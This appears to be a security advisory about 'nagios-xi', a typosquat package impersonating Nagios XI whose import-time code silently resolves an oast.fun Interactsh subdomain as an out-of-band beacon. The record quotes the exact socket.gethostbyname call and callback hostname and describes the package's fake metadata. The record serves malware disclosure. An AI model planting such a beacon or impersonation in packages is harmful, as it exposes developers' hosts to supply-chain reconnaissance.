summary: nagios-xi typosquat performs import-time OAST DNS beacon to oast.fun
details: On `import nagios_xi`, the package's `__init__.py` (lines 5-8) invokes `socket.gethostbyname("atlass-check.autaeqjhfowvnnmkwhxjtq8x39d8nder1.oast.fun")` inside a silent try/except. oast.fun is ProjectDiscovery's Interactsh out-of-band callback service; the DNS query itself is the exfiltration channel, confirming code execution on the installer's host and leaking the resolver IP to whoever controls the unique 32-character Interactsh subdomain. The package ships no actual functionality — it impersonates the Nagios XI commercial monitoring product (name `nagios-xi`, version `19.5.0` mimicking real Nagios XI versioning) while declaring an anonymous ProtonMail author (`Coding Team <pocbug@protonmail.com>`), a generic `package utility` description, and an empty README. The combination of brand impersonation, placeholder metadata, and an import-time OAST beacon as the package's sole behavior is reconnaissance for a supply-chain attack against developers searching for Nagios XI integrations.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
